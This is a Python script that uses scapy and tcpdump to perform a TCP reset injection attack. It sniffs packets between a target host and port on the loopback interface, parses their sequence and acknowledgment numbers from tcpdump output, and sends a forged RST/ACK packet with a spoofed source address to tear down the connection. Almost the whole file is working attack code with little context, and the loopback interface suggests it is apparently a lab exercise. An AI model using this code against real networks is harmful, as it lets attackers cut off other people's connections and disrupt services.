import subprocess
from logging import info, debug

from scapy.config import conf
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
from scapy.supersocket import L3RawSocket


def log_pack(pack):
    debug("Logging new pack...")
    info(pack.summary())
    info(f"IP source = {pack[IP].src}")
    info(f"Port source = {pack[TCP].sport}")
    info(f"IP dest = {pack[IP].dst}")
    info(f"Port dest = {pack[TCP].dport}")
    info(f"Seq = {pack[TCP].seq}, ACK = {pack[TCP].ack}")


def parse(string: str):
    lis = string.split()
    info(lis)
    to_pos = lis.index('>')
    tmp = lis[to_pos + 1]
    dst, dport = tmp.strip(':').split('.')
    dport = int(dport)
    if dst == "localhost":
        dst = "127.0.0.1"
    to_pos = lis.index("ack")
    ack = int(lis[to_pos + 1].strip(','))
    seq = 0
    if "seq" in lis:
        to_pos = lis.index("seq")
        seq = int(lis[to_pos + 1].split(':')[-1].strip(','))
    return dst, dport, ack, seq


def attack(a_addr: (int, int)):
    debug("Start of attack")
    conf.L3socket = L3RawSocket

    def send_rst():
        debug("Start sending attack message")
        ip_layer = IP(dst=a_addr[0], src=dst)
        tcp_layer = TCP(flags='AR',
                        seq=ack,
                        ack=seq,
                        dport=a_addr[1],
                        window=512,
                        sport=dport)
        my_pack = ip_layer / tcp_layer / "hack"
        log_pack(my_pack)
        info("RST pack sent")
        send(my_pack, verbose=2, iface="lo")

    debug("Getting devices...")
    debug(subprocess.run(["tcpdump", "-D"], capture_output=True).stdout)
    debug(f"Sniff tcp from host {a_addr[0]}, port {a_addr[1]}")
    cmd = ["tcpdump", "-c", "2", "-i", "lo", f"src {a_addr[0]}", "and", f"src port {a_addr[1]}",
           "and",
           "tcp"]
    proc = subprocess.run(cmd, capture_output=True, check=True)
    debug("Exception catch")
    debug("Process terminated")
    out = proc.stdout.decode("utf-8").split('\n')
    debug(out)
    debug("Finish sniffing")
    ack = 0
    seq = 0
    dst = ''
    dport = 0
    for pack in out:
        string = pack.strip()
        if not string:
            continue
        dst, dport, new_ack, new_seq = parse(string)
        ack += new_ack
        seq += new_seq
    ack -= 1
    send_rst()
